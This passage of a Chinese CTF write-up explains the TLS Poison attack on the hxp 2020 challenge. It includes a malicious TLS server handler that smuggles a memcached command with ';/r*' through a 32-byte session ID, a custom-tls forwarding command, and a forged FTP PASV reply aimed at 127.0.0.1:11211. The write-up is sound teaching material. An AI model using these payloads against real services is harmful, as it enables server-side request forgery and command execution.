&#x518D;&#x8BBF;&#x95EE;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6076;&#x610F;&#x7684; TLS Server &#x3002;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x8BF7;&#x6C42;&#x7684; UA &#x4E0A;&#x505A;&#x533A;&#x5206;&#xFF0C;&#x5224;&#x65AD; UA &#x4E2D;&#x662F;&#x5426;&#x6709; git &#x6765;&#x533A;&#x5206;&#x8FD9;&#x4E24;&#x8005;&#x8BF7;&#x6C42;&#x6765;&#x8FD4;&#x56DE;&#x5BF9;&#x5E94;&#x7684;&#x54CD;&#x5E94;&#xFF0C;&#x6240;&#x4EE5; rustls &#x6211;&#x5C31;&#x4E0D;&#x8003;&#x8651;&#x4E86;&#x2026;&#x8FD9;&#x73A9;&#x610F;&#x7740;&#x5B9E;&#x96BE;&#x6539;&#xFF0C;&#x4E8E;&#x662F;&#x9009;&#x7528;&#x4E86; tlslite-ng &#x4F5C;&#x4E3A; TLS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;<code>MySimpleHTTPHandler</code>&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x5904;&#x7406; HTTP &#x8BF7;&#x6C42;&#x7684;&#x5173;&#x952E;&#x4EE3;&#x7801;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-string">&apos;git&apos;</span> <span class="hljs-keyword">in</span> str(self.headers):</span><br><span class="line">  print(<span class="hljs-string">&apos;This is git! Redirecting it back to memcached and shutting down&apos;</span>)</span><br><span class="line">  <span class="hljs-keyword">assert</span> session_id, <span class="hljs-string">&apos;Session id should have been set at this point&apos;</span></span><br><span class="line">  headers = {</span><br><span class="line">    <span class="hljs-string">&apos;Location&apos;</span>: <span class="hljs-string">f&apos;https://tls.exmaple.com:11211/pwned&apos;</span>,</span><br><span class="line">  }</span><br><span class="line">  self.wfile.write(get_http_response(<span class="hljs-number">302</span>, headers, <span class="hljs-string">&apos;&apos;</span>))</span><br><span class="line">  <span class="hljs-keyword">return</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">  print(<span class="hljs-string">&apos;This is PHP! Showing them something that looks like a git repo and stealing sandbox ID&apos;</span>)</span><br><span class="line">  b64_sandbox_id = re.search(<span class="hljs-string">&apos;/(.{14})/&apos;</span>, self.path).group(<span class="hljs-number">1</span>)</span><br><span class="line">  <span class="hljs-keyword">while</span> len(b64_sandbox_id) % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:</span><br><span class="line">    b64_sandbox_id += <span class="hljs-string">&apos;=&apos;</span></span><br><span class="line">    sandbox_id = base64.b64decode(b64_sandbox_id)</span><br><span class="line">    <span class="hljs-keyword">assert</span> len(sandbox_id) == <span class="hljs-number">10</span>, <span class="hljs-string">f&apos;The sandbox id should have exactly 10 bytes, got: <span class="hljs-subst">{sandbox_id}</span>&apos;</span></span><br><span class="line">    session_id = <span class="hljs-string">b&apos;\r\nset &apos;</span> + sandbox_id + <span class="hljs-string">b&apos;;/r* 0 0 2\r\nOK\r\n&apos;</span></span><br><span class="line">    <span class="hljs-keyword">assert</span> len(session_id) == <span class="hljs-number">32</span>, <span class="hljs-string">f&apos;The session should have exactly 32 bytes, got: <span class="hljs-subst">{session_id}</span>&apos;</span></span><br><span class="line">    print(<span class="hljs-string">f&apos;Got sandbox id: <span class="hljs-subst">{sandbox_id}</span>, session_id: <span class="hljs-subst">{session_id}</span>&apos;</span>)</span><br><span class="line"></span><br><span class="line">    fake_git = <span class="hljs-string">&apos;001e# service=git-upload-pack\n&apos;</span></span><br><span class="line">    self.wfile.write(get_http_response(<span class="hljs-number">200</span>, {}, fake_git))</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x9898;&#x76EE;&#x8BBE;&#x7F6E;&#x4E86; sandbox &#xFF0C;&#x5360;&#x7528;&#x4E86; 10 &#x5B57;&#x8282;&#xFF0C;&#x800C; TLS 1.2 &#x4E2D;&#x7684; SessionID &#x5C40;&#x9650;&#x4E8E; 32 &#x5B57;&#x8282;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>;/readflag</code>&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x8D85;&#x51FA;&#x957F;&#x5EA6;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>;/r*</code>&#x4E5F;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x8BFB;&#x53D6; flag &#x547D;&#x4EE4;&#x3002;&#x6700;&#x540E;&#x6253;&#x5305;&#x6574;&#x7406;&#x7684; Exp &#x653E;&#x5728;&#xFF1A;<a href="https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1</a></p><p>&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x642D;&#x5EFA;&#x597D; TLS &#x670D;&#x52A1;&#x5668;&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x540E;&#x7528; exp.py &#x81EA;&#x52A8;&#x53D1;&#x5305;&#x5C31;&#x80FD;&#x62FF;&#x5230; flag &#x4E86;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png" alt></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2"></a>Solution 2</h3><p>&#x5F53;&#x7136;&#x5982;&#x679C;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x590D;&#x73B0; TLS Poison &#x6211;&#x4E5F;&#x4E0D;&#x4F1A;&#x8FD9;&#x4E48;&#x8BE6;&#x7EC6;&#x7684;&#x5199;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x6765;&#x8BB2;&#x8FD9;&#x4E2A;&#x9898;&#x4E86;&#xFF0C; CTF &#x80FD;&#x5E26;&#x7ED9;&#x6211;&#x6700;&#x5927;&#x7684;&#x5FEB;&#x4E50;&#x5C31;&#x662F;&#x770B;&#x5230;&#x4E00;&#x4E9B;&#x5728;&#x81EA;&#x5DF1;&#x9884;&#x671F;&#x4E4B;&#x5916;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x5F80;&#x5F80;&#x90FD;&#x66F4;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x4E5F;&#x66F4; Amazing &#x3002;</p><p>&#x7ED3;&#x5408;&#x524D;&#x6587;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; FTPS &#x6765;&#x8FDB;&#x884C;&#x89E3;&#x7B54;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x3002;&#x5982;&#x679C;&#x4F7F;&#x7528; FTPS &#xFF0C;&#x90A3;&#x4E48;&#x91CD;&#x5B9A;&#x5411;&#x3001;DNS Rebinding &#x7684;&#x64CD;&#x4F5C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4E0D;&#x9700;&#x8981;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>PASV</code>&#x76F4;&#x63A5;&#x5C06;&#x6570;&#x636E;&#x901A;&#x9053;&#x6307;&#x5411; 127.0.0.1:11211 &#x5373;&#x53EF;&#x3002;</p><p>&#x90A3;&#x4E48;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x9700;&#x8981;&#x786E;&#x5B9A; git &#x4E2D;&#x7684; libcurl &#x662F;&#x5426;&#x53D7;&#x5230;<code>PASV</code>&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE; git &#x7248;&#x672C;&#x3001;&#x7B80;&#x5355;&#x642D;&#x5EFA;&#x4E00;&#x4E2A;&#x6076;&#x610F;&#x7684; FTP &#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x5C55;&#x5F00;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x4E86;&#x3002;&#xFF08;&#x5176;&#x5B9E;&#x662F;&#x6BD4;&#x8F83;&#x61D2;&#xFF09;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x76F4;&#x63A5;&#x5F00;&#x59CB;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; FTPS &#x8FDB;&#x884C;&#x89E3;&#x9898;&#x3002;</p><p>&#x6309;&#x7167;&#x4E4B;&#x524D;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x51E0;&#x4E2A;&#x70B9;&#xFF1A;</p><ul><li>&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x4E4B;&#x524D;&#x9898;&#x76EE;&#x4F7F;&#x7528;<code>file_get_contents</code>&#x5BF9;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x786E;&#x8BA4;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x521B;&#x5EFA;<code>/info/ref</code>&#x6587;&#x4EF6;&#xFF0C;&#x5185;&#x5BB9;&#x4E3A;&#x9898;&#x76EE;&#x8981;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x5373;&#x53EF;</li><li>&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x6B63;&#x5219;&#xFF1F;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x597D;&#x533F;&#x540D; ftps &#x5373;&#x53EF;&#xFF0C;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x5F15;&#x5165;&#x4E3A;&#x4E86;&#x7528;&#x6237;&#x8BA4;&#x8BC1;&#x800C;&#x4F7F;&#x7528;&#x7684;<code>@</code>&#x7B26;&#x53F7;&#x4E86;&#xFF0C;&#x5176;&#x4F59;&#x7684;&#x5B57;&#x7B26;&#x5C31;&#x5C5E;&#x4E8E;&#x6B63;&#x5219;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E86;</li><li>&#x7528;&#x9690;&#x5F0F;&#x8FD8;&#x662F;&#x663E;&#x5F0F;&#xFF1F;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x662F;<code>ftps://ftps.exmaple.com:11211/</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#xFF0C;&#x8FD9;&#x53EA;&#x80FD;&#x662F;&#x9690;&#x5F0F; FTPS &#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;&#x9690;&#x5F0F; FTPS</li></ul><p>&#x5269;&#x4E0B;&#x7684;&#x4FBF;&#x662F;&#x5982;&#x4F55;&#x6784;&#x9020; exp &#x7684;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x53BB;&#x5F04;&#x4E00;&#x4E2A;&#x9690;&#x5F0F; FTPS &#xFF0C;&#x96BE;&#x9053;&#x8FD8;&#x8981;&#x4FEE;&#x6539;&#x4E2A;&#x6076;&#x610F; vsftpd &#xFF1F;&#x90A3;&#x6837;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; rustls &#x7684;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#xFF0C;&#x8BE5;&#x529F;&#x80FD;&#x53EF;&#x4EE5;&#x5E2E;&#x6211;&#x4EEC;&#x5904;&#x7406;&#x4E86; TLS &#x521B;&#x5EFA;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x4E14;&#x6309;&#x7167;&#x4E4B;&#x524D;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x628A;&#x5B83;&#x76F4;&#x63A5;&#x4F5C;&#x4E3A;&#x6076;&#x610F; TLS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x9700;&#x8981;&#x5F04;&#x4E00;&#x4E2A; socket &#x7528;&#x6765;&#x5904;&#x7406; FTP &#x5373;&#x53EF;&#x3002;</p><p>&#x4F9D;&#x65E7;&#x4F7F;&#x7528;&#x6211;&#x4ED3;&#x5E93;&#x7684; TLS &#x5DE5;&#x5177;&#xFF1A;<a href="https://github.com/ZeddYu/TLS-poison/" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/</a> &#xFF0C;&#x6309;&#x7167; setup &#x505A;&#x597D;&#x521D;&#x59CB;&#x5316;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x5F00;&#x542F; rustls &#x7684;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#xFF0C;&#x5C06; TLS &#x4E0A;&#x5C42;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#x5230; 2048 &#x7AEF;&#x53E3;&#xFF1A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x5728; 2048 &#x7AEF;&#x53E3;&#x6211;&#x4EEC;&#x5F04;&#x4E2A; socket &#x76D1;&#x542C;&#x5E76;&#x8BFB;&#x4E00;&#x4E0B; FTP &#xFF0C;&#x7136;&#x540E;&#x5C31;&#x662F;&#x5904;&#x7406; FTP &#x547D;&#x4EE4;&#x7684;&#x4E8B;&#x60C5;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; vsftpd &#x6765;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x54CD;&#x5E94;&#x7684;&#x53C2;&#x8003;&#xFF0C;&#x6700;&#x540E;&#x5B9E;&#x73B0;&#xFF1A;<a href="https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py</a></p><p><strong>PS&#xFF1A;&#x8FD9;&#x91CC; FTP &#x670D;&#x52A1;&#x8BB0;&#x5F97;&#x8981;&#x5B8C;&#x6574;&#x5B9E;&#x73B0;&#x5BF9; PASV &#x4E4B;&#x540E;&#x7684;&#x547D;&#x4EE4;&#x5904;&#x7406;&#xFF0C;&#x5426;&#x5219;&#x653B;&#x51FB;&#x5931;&#x8D25;&#x3002;</strong></p><p>&#x5929;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x5751;&#x4E86;&#x6211;&#x591A;&#x4E45;&#x2026;&#x5F53;&#x65F6;&#x6B7B;&#x6D3B;&#x90FD;&#x4E0D;&#x80FD;&#x590D;&#x73B0;&#xFF0C;&#x95EE;&#x4F5C;&#x8005; 0xbb &#x4E5F;&#x4E0D;&#x77E5;&#x9053;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#xFF0C;&#x53C8;&#x662F;&#x6392; curl &#x7248;&#x672C;&#xFF0C;&#x53C8;&#x662F;&#x6392; git &#x7248;&#x672C;&#xFF0C;&#x53C8;&#x662F;&#x6392; OpenSSL &#xFF0C;&#x53C8;&#x662F;&#x6392; GnuTLS &#xFF0C;&#x53CD;&#x6B63;&#x5404;&#x79CD;&#x6392; bug &#xFF0C;&#x4E07;&#x5FF5;&#x4FF1;&#x7070;&#xFF0C;&#x6700;&#x540E;&#x624D;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x2026;&#x7B80;&#x76F4;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x81EA;&#x5DF1;&#x7F16;&#x8BD1;&#x4E86;&#x4E00;&#x4E2A;&#x5B58;&#x5728;<code>pasv</code>&#x6F0F;&#x6D1E;&#x7684; curl &#x8C03;&#x8BD5;&#xFF0C;&#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x7684; ftps &#x670D;&#x52A1;&#x5668;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x5BF9;&#x6211;&#x4EEC; 127.0.0.1:11211 &#x8FDB;&#x884C; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#xFF0C;&#x5C31;&#x4F1A;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x53D1;&#x9001;&#x5230; 11211 &#x7AEF;&#x53E3;&#x4E86;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png" alt></p><p>&#x5199;&#x5165;&#x4E4B;&#x540E;&#x57FA;&#x672C;&#x4E0A;&#x5C31;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x3002;</p><p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4EEC;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#xFF1A;</p><ul><li><p>&#x9996;&#x5148;&#x5F97;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x9898;&#x76EE;&#x62FF;&#x5230; cookie </p></li><li><p>&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>file_get_contents</code>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; vsftpd &#x6765;&#x5728;&#x533F;&#x540D; ftp &#x76EE;&#x5F55;&#x4E0B;&#x653E;&#x7F6E;<code>/info/ref</code>&#x6587;&#x4EF6;&#xFF0C;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5C31;&#x662F; &#x201C;001e# service=git-upload-pack\n&#x201D;</p></li><li><p>&#x9898;&#x76EE;&#x4F7F;&#x7528;<code>file_get_contents</code>&#x8BBF;&#x95EE;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5173;&#x95ED; vsftpd &#xFF0C;&#x7136;&#x540E;&#x5F00;&#x542F; rustls &#x6076;&#x610F; TLS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6CE8;&#x610F;&#x63D0;&#x524D;&#x8BBE;&#x7F6E;&#x5728; redis &#x5F53;&#x4E2D;&#x8BBE;&#x7F6E;&#x597D; payload</p></li><li><p>&#x9898;&#x76EE;&#x6267;&#x884C;<code>exec</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4F7F;&#x7528; git &#x6765;&#x8BBF;&#x95EE;&#x6211;&#x4EEC;&#x7684; FTPS &#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x53CC;&#x65B9;&#x5EFA;&#x7ACB; TLS &#x63E1;&#x624B;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x8BBE;&#x7F6E;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x8BFB;&#x53D6; flag &#x7684; Session ID </p></li><li><p>&#x5EFA;&#x7ACB;&#x63E1;&#x624B;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x6267;&#x884C; FTP &#x6D41;&#x7A0B;</p></li><li><p>&#x5728;&#x9898;&#x76EE; git &#x5904;&#x7406; FTP &#x6D41;&#x7A0B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x7ED9; git &#x53D1;&#x51FA;&#x7684;<code>PASV</code>&#x547D;&#x4EE4;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;<code>227 Entering Passive Mode (127,0,0,1,43,203)\r\n</code></p></li><li><p>git &#x4F1A;&#x6839;&#x636E;&#x5F97;&#x5230;&#x7684; 127.0.0.1:11211 &#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x5C1D;&#x8BD5;&#x8FDB;&#x884C; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;</p></li><li><p>&#x81F3;&#x6B64;&#xFF0C;&#x5B8C;&#x6210;&#x5BF9; Memcached &#x7684;&#x653B;&#x51FB;&#xFF0C;&#x6210;&#x529F;&#x5199;&#x5165;<code>\r\nset 1234567890;/r* 0 0 